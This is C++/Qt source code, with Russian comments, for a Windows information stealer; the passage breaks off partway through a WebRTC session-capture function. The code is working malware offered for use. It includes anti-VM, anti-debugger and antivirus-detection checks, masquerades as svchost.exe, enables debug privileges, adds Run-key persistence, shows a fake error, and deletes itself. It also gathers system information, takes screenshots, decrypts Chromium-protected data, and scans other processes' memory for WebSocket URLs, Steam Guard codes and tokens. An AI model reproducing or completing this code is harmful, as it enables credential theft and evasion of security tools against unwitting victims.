#include <windows.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <QVBoxLayout>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"
#include "stealerworker.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Функция для логирования
void Log(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) {
        g_mainWindow->emitLog(message);
    }
    std::cout << message.toStdString() << std::endl;
}

// Реализация шифрования данных
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        throw std::runtime_error("Encryption parameters cannot be empty");
    }

    // Получаем ключи и IV
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32); // Для AES-256 нужно 32 байта
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        throw std::runtime_error("Failed to open AES algorithm provider: " + std::to_string(status));
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to set chaining mode: " + std::to_string(status));
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to generate symmetric key: " + std::to_string(status));
    }

    // Подготавливаем данные для шифрования
    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to calculate encrypted data size: " + std::to_string(status));
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to encrypt data: " + std::to_string(status));
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // Добавляем IV в начало зашифрованных данных
    std::vector<BYTE> finalData(iv.size() + cbResult);
    std::copy(iv.begin(), iv.end(), finalData.begin());
    std::copy(encryptedData.begin(), encryptedData.begin() + cbResult, finalData.begin() + iv.size());

    // Преобразуем зашифрованные данные (включая IV) в строку base64
    DWORD base64Size = 0;
    CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size);
    std::vector<char> base64Data(base64Size);
    CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size);

    return std::string(base64Data.data(), base64Size - 1); // Убираем завершающий \0
}

// Реализация дешифрования данных
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty()) {
        return "";
    }

    if (!g_mainWindow) {
        return "";
    }

    std::string key1 = g_mainWindow->config.encryptionKey1;
    std::string key2 = g_mainWindow->config.encryptionKey2;
    std::string salt = g_mainWindow->config.encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        Log(QString("Decryption keys or salt are empty"));
        return "";
    }

    // Декодируем base64
    DWORD binarySize = 0;
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr);
    std::vector<BYTE> binaryData(binarySize);
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr);

    // Извлекаем IV (первые 16 байт)
    if (binarySize < 16) {
        Log(QString("Encrypted data too short to contain IV"));
        return "";
    }
    std::array<unsigned char, 16> iv;
    std::copy(binaryData.begin(), binaryData.begin() + 16, iv.begin());

    // Оставшиеся данные — это зашифрованный текст
    std::vector<BYTE> encryptedContent(binaryData.begin() + 16, binaryData.end());
    DWORD encryptedSize = binarySize - 16;

    // Получаем ключи
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        Log(QString::fromStdString("Failed to open AES algorithm provider for decryption: " + std::to_string(status)));
        return "";
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to set chaining mode for decryption: " + std::to_string(status)));
        return "";
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to generate symmetric key for decryption: " + std::to_string(status)));
        return "";
    }

    // Дешифруем данные
    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to calculate decrypted data size: " + std::to_string(status)));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to decrypt data: " + std::to_string(status)));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string((char*)decryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool CheckVirtualEnvironment() {
    bool isVM = false;

    // Проверка реестра на наличие идентификаторов виртуальных машин
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                Log(QString::fromStdString("VM detected via SCSI identifier: " + identifier));
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка наличия модулей песочницы или отладчика
    if (GetModuleHandleA("SbieDll.dll")) {
        Log(QString("Sandboxie detected (SbieDll.dll)"));
        isVM = true;
    }
    if (GetModuleHandleA("dbghelp.dll")) {
        Log(QString("Debugger detected (dbghelp.dll)"));
        isVM = true;
    }

    // Проверка системной информации
    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        Log(QString::fromStdString("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors)));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus{};
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        Log(QString::fromStdString("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB"));
        isVM = true;
    }

    // Проверка времени выполнения
    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        Log(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms"));
        isVM = true;
    }

    // Проверка MAC-адреса
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            if (mac.find("00-50-56") != std::string::npos || // VMware
                mac.find("00-0C-29") != std::string::npos || // VMware
                mac.find("00-1C-14") != std::string::npos || // VMware
                mac.find("00-05-69") != std::string::npos || // VMware
                mac.find("08-00-27") != std::string::npos) { // VirtualBox
                Log(QString::fromStdString("VM MAC address detected: " + mac));
                isVM = true;
            }
        }
    }

    // Проверка специфических драйверов
    const char* vmDrivers[] = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", nullptr};
    for (int i = 0; vmDrivers[i]; i++) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + std::string(vmDrivers[i]);
        if (std::filesystem::exists(driverPath)) {
            Log(QString::fromStdString("VM driver detected: " + std::string(vmDrivers[i])));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        Log(QString("Debugger detected via IsDebuggerPresent"));
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log(QString("Failed to load ntdll.dll for NtQueryInformationThread"));
        return false;
    }

    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(hNtdll, "NtQueryInformationThread"));
    if (!NtQueryInformationThread) {
        Log(QString("Failed to get NtQueryInformationThread address"));
        return false;
    }

    THREAD_BASIC_INFORMATION tbi{};
    NTSTATUS status = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
    if (NT_SUCCESS(status) && tbi.TebBaseAddress) {
        DWORD debugPort = 0;
        status = NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
        if (NT_SUCCESS(status) && debugPort != 0) {
            Log(QString("Debugger detected via NtQueryInformationThread"));
            return true;
        }
    }

    const char* avProcesses[] = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe", nullptr
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for AV check"));
        return false;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            for (int i = 0; avProcesses[i]; i++) {
                std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                    Log(QString::fromStdString("Antivirus process detected: " + std::string(avProcesses[i])));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ
bool MainWindow::AntiAnalysis() {
    if (config.antiVM && CheckVirtualEnvironment()) {
        Log(QString("Virtual machine detected, exiting"));
        return true;
    }

    if (CheckDebuggerOrAntivirus()) {
        Log(QString("Debugger or Antivirus detected, exiting"));
        return true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        Log(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting"));
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32{};
        te32.dwSize = sizeof(te32);
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            Log(QString::fromStdString("Too many threads detected: " + std::to_string(threadCount) + ", exiting"));
            return true;
        }
    } else {
        Log(QString("Failed to create thread snapshot for anti-analysis"));
    }

    char processName[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
        Log(QString::fromStdString("Suspicious process name detected: " + procName + ", exiting"));
        return true;
    }

    return false;
}

// Маскировка процесса
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
    wchar_t systemPath[MAX_PATH] = {0};
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\svchost.exe");
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log(QString("Failed to load ntdll.dll for NtSetInformationProcess"));
        return;
    }

    pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
        GetProcAddress(hNtdll, "NtSetInformationProcess"));
    if (!NtSetInformationProcess) {
        Log(QString("Failed to get NtSetInformationProcess address"));
        return;
    }

    wchar_t fakeName[] = L"svchost.exe";
    NTSTATUS status = NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
    if (NT_SUCCESS(status)) {
        Log(QString("Process masked as svchost.exe"));
    } else {
        Log(QString("Failed to mask process: " + QString::number(status)));
    }
}

// Повышение привилегий и скрытие
void MainWindow::Stealth() {
    if (!config.silent) return;

    SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hToken);
        Log(QString("Privileges elevated"));
    } else {
        Log(QString("Failed to elevate privileges"));
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        Log(QString("Added to startup (HKEY_CURRENT_USER)"));
    } else {
        Log(QString("Failed to add to startup (HKEY_CURRENT_USER)"));
    }
}

// Обеспечение персистентности
void MainWindow::Persist() {
    if (!config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        Log(QString("Persisted in HKEY_LOCAL_MACHINE"));
    } else {
        Log(QString("Failed to persist (HKEY_LOCAL_MACHINE)"));
    }
}

// Отображение фейковой ошибки
void MainWindow::FakeError() {
    if (!config.fakeError) return;

    MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
    Log(QString("Displayed fake error message"));
}

// Самоуничтожение
void MainWindow::SelfDestruct() {
    if (!config.selfDestruct) return;

    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string batchFile = std::filesystem::temp_directory_path().string() + "\\self_destruct.bat";
    std::ofstream bat(batchFile);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "timeout /t 1 /nobreak >nul\n";
        bat << "del \"" << path << "\"\n";
        bat << "del \"%~f0\"\n";
        bat.close();

        ShellExecuteA(nullptr, "open", batchFile.c_str(), nullptr, nullptr, SW_HIDE);
        Log(QString("Self-destruct initiated"));
        ExitProcess(0);
    } else {
        Log(QString("Failed to create self-destruct batch file"));
    }
}

// Получение версии ОС через RtlGetVersion
typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
bool GetOSVersion(RTL_OSVERSIONINFOW& osInfo) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        return false;
    }

    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    return RtlGetVersion(&osInfo) == 0;
}

// Получение системной информации
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::string result;
    char username[256] = {0};
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result += "Username: " + std::string(username) + "\n";
    } else {
        result += "Username: Unknown\n";
        Log(QString("Failed to get username"));
    }

    char computerName[256] = {0};
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result += "Computer Name: " + std::string(computerName) + "\n";
    } else {
        result += "Computer Name: Unknown\n";
        Log(QString("Failed to get computer name"));
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
        result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
    } else {
        result += "Memory Info: Unknown\n";
        Log(QString("Failed to get memory info"));
    }

    RTL_OSVERSIONINFOW osInfo{};
    if (GetOSVersion(osInfo)) {
        result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        result += "Build Number: " + std::to_string(osInfo.dwBuildNumber) + "\n";
    } else {
        result += "OS Info: Unknown\n";
        Log(QString("Failed to get OS version"));
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result += "Adapter Name: " + std::string(adapter->AdapterName) + "\n";
            result += "Description: " + std::string(adapter->Description) + "\n";
            result += "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result += mac;
                if (i < adapter->AddressLength - 1) result += "-";
            }
            result += "\nIP Address: " + std::string(adapter->IpAddressList.IpAddress.String) + "\n";
        }
    } else {
        result += "Network Info: Unknown\n";
        Log(QString("Failed to get network adapters info"));
    }

    return result;
}

// Создание скриншота
std::string TakeScreenshot(const std::string& dir) {
    if (!g_mainWindow || !g_mainWindow->config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        Log(QString("Failed to get screen DC"));
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        Log(QString("Failed to create memory DC"));
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log(QString("Failed to create bitmap"));
        return "";
    }

    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    HRESULT hr = CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG
    if (FAILED(hr)) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        DeleteObject(hBitmap);
        Log(QString("Failed to get JPEG CLSID"));
        return "";
    }

    std::string screenshotName = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    hr = bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr);
    if (FAILED(hr)) {
        screenshotName.clear();
        Log(QString("Failed to save screenshot"));
    } else {
        Log(QString::fromStdString("Screenshot saved: " + screenshotName));
    }

    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    DeleteObject(hBitmap);
    return screenshotName;
}

// Дешифрование данных Chromium
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData{};
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }

    Log(QString::fromStdString("Failed to decrypt Chromium data: " + std::to_string(GetLastError())));
    return "";
}

// Захват WebSocket сессий
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for WebSocket capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, steamGuardRegex)) {
                                    result += "Steam Guard Code: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for WebRTC capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
